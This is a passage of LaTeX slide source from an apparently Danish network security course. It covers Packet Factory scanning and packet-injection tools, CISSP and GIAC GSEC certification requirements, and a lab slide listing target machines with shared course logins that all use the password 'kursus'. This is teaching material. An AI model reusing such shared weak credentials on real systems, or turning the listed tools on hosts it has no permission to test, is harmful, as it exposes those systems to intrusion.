\end{list1}

\slide{Packet factory projects}

\begin{center}
\colorbox{white}{\includegraphics[width=20cm]{images/packetfactory-header.jpg}}
\end{center}

\begin{list2}
\item Projects (udvalgte):
\item firewalk [gateway ACL scanner]
\item firestorm (in development) [next 
  generation scanner]
\item ISIC [IP stack integrity checker]
\item libnet [network packet assembly/injection library]     
\item libradiate [802.11b frame assembly/injection library]     
\item nemesis [command line IP stack]     
\item ngrep [GNU grep for the network]     
\item packit [tool to monitor, and inject customized IPv4 traffic]     
\item Billede og information fra \link{http://www.packetfactory.net}
\end{list2}



\slide{CISSP fra ISC2}

\hlkimage{16cm}{images/cissp-logo.png}

\begin{list1}
\item Primære website: \link{http://www.isc2.org}
\item Vigtigt link \link{http://www.cccure.org/}
\item Den kræver mindst 3 års erfaring indenfor et relevant fagområde
\item Multiple choice 6 timer 250 spørgsmål - kan tages i Danmark
\end{list1}



\slide{GIAC GSEC krav}

\hlkimage{4cm}{images/SANS-logo.png}

\begin{list1}
\item Security Essentials - basal sikkerhed
\item Krav om en \emph{Practical assignment} - mindst 8 sider, 15
  sider i gennemsnit
\item multiple choice eksamen
\item Primære website: \link{http://www.giac.org}
\item Reading room: \link{http://www.sans.org/rr/}
\item Der findes en god oversigt i filen 
\emph{GIAC Certification: Objectives and Curriculum}\\
  \link{http://www.giac.org/overview/brief.pdf}

\end{list1}

\slide{Hostoplysninger}

\begin{list1}
\item I bedes registrere IP-adresserne for maskinerne
\item Filer til installation - installationsprogrammer:\\
http:// \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm /public/windows/
\end{list1}

\slide{Vores targets}
\begin{list1}
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - IOS router 
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - Windows 2000
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - Linux
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - Stitch
  OpenBSD
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - Fiona
  OpenBSD scanserver
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - Din egen
  arbejdsstation - Windows
\item Fiona kursus login brugernavne: kursus1, kursus2, ... kursus10
kodeord: \verb+kursus+ - uanset brugernavn
%\item Sulley kursus login brugernavn: kursus kodeord: kursus
\item Skift til root med: \verb+sudo -s+
\end{list1}

\end{document}
